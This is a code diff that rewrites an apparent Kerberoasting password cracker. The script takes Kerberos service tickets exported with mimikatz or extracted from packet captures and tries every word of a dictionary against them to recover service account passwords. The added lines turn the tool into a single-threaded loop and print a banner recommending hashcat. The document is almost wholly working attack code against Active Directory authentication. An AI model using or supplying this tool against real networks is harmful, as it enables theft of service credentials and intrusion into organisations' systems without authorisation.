@@ -2,21 +2,7 @@
 
 import kerberos
 from pyasn1.codec.ber import encoder, decoder
-from multiprocessing import Process, JoinableQueue, Manager
 import glob
-
-wordlist = JoinableQueue()
-enctickets = None
-#ENDOFQUEUE = 'ENDOFQUEUEENDOFQUEUEENDOFQUEUE'
-
-
-def loadwordlist(wordlistfile, wordlistqueue, threadcount):
-	with open(wordlistfile, 'rb') as f:
-		for w in f:
-			wordlistqueue.put(w.decode('utf-8').strip(), True)
-	for i in range(threadcount):
-		wordlistqueue.put('ENDOFQUEUEENDOFQUEUEENDOFQUEUE')
-
 
 def crack(wordlist, enctickets):
 	toremove = []
@@ -38,62 +24,63 @@ def crack(wordlist, enctickets):
 			if not enctickets:
 				return
 
-if __name__ == '__main__':
-	import argparse
 
-	parser = argparse.ArgumentParser(description='Read kerberos ticket then modify it')
-	parser.add_argument('wordlistfile', action='store',
-					metavar='dictionary.txt', type=argparse.FileType('r'), # windows closes it in thread
-					help='the word list to use with password cracking')
-	parser.add_argument('files', nargs='+', metavar='file.kirbi', type=argparse.FileType('r'),
-					help='File name to crack. Use asterisk \'*\' for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')
-	parser.add_argument('-t', '--threads', dest='threads', action='store', required=False, 
-					metavar='NUM', type=int, default=5,
-					help='Number of threads for guessing')
-	
-	args = parser.parse_args()
+print('''
 
-	if args.threads < 1:
-		raise ValueError("Number of threads is too small")
+    USE HASHCAT, IT'S HELLA FASTER!!
+
+''')
+
+import argparse
+import sys
+
+parser = argparse.ArgumentParser(description='Read kerberos ticket then modify it')
+parser.add_argument('wordlistfile', action='store',
+				metavar='dictionary.txt', type=argparse.FileType('rb'), # windows closes it in thread
+				help='the word list to use with password cracking')
+parser.add_argument('files', nargs='+', metavar='file.kirbi', type=str,
+				help='File name to crack. Use asterisk \'*\' for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')
+
+args = parser.parse_args()	
 
 
-	p = Process(target=loadwordlist, args=(args.wordlistfile.name, wordlist, args.threads))
-	p.start()
+# load the tickets
+enctickets = []
+i = 0
+for path in args.files:
+	for f in glob.glob(path):
+		with open(f, 'rb') as fd:
+			data = fd.read()
+		#data = open('f.read()
 
-	
-	# is this a dump from extactrtgsrepfrompcap.py or a dump from ram (mimikatz)
-
-	manager = Manager()
-	enctickets = manager.list()
-
-	i = 0
-	for path in args.files:
-		for f in glob.glob(path):
-			with open(f, 'rb') as fd:
-				data = fd.read()
-			#data = open('f.read()
-
-			if data[0] == '\x76':
-				# rem dump 
-				enctickets.append((str(decoder.decode(data)[0][2][0][3][2]), i, f))
+		if data[0] == 0x76:
+			# rem dump 
+			#enctickets.append((str(decoder.decode(data)[0][2][0][3][2]), i, f))
+			enctickets.append(((decoder.decode(data)[0][2][0][3][2]).asOctets(), i, f))
+			i += 1
+		elif data[:2] == '6d':
+			for ticket in data.strip().split('\n'):
+				enctickets.append(((decoder.decode(ticket.decode('hex'))[0][4][3][2]).asOctets(), i, f))
 				i += 1
-			elif data[:2] == '6d':
-				for ticket in data.strip().split('\n'):
-					enctickets.append((str(decoder.decode(ticket.decode('hex'))[0][4][3][2]), i, f))
-					i += 1
 
-	crackers = []
-	for i in range(args.threads):
-		p = Process(target=crack, args=(wordlist,enctickets))
-		p.start()
-		crackers.append(p)
+if len(enctickets):
+	print("Cracking %i tickets..." % len(enctickets))
+else:
+	print("No tickets found")
+	sys.exit()
 
-	for p in crackers:
-		p.join()
+# load wordlist
+for w in args.wordlistfile:
+	word = w.decode('utf-8').strip()
+	hash = kerberos.ntlmhash(word)
+	for et in enctickets:
+		kdata, nonce = kerberos.decrypt(hash, 2, et[0])
+		if kdata:
+			print('found password for ticket %i: %s  File: %s' % (et[1], word, et[2]))
+			enctickets.remove(et)
+			if len(enctickets) == 0:
+				print('Successfully cracked all tickets')
+				sys.exit()
 
-	wordlist.close()
-
-	if len(enctickets):
-		print("Unable to crack %i tickets" % len(enctickets))
-	else:
-		print("All tickets cracked!")
+if len(enctickets):
+	print("Unable to crack %i tickets" % len(enctickets))
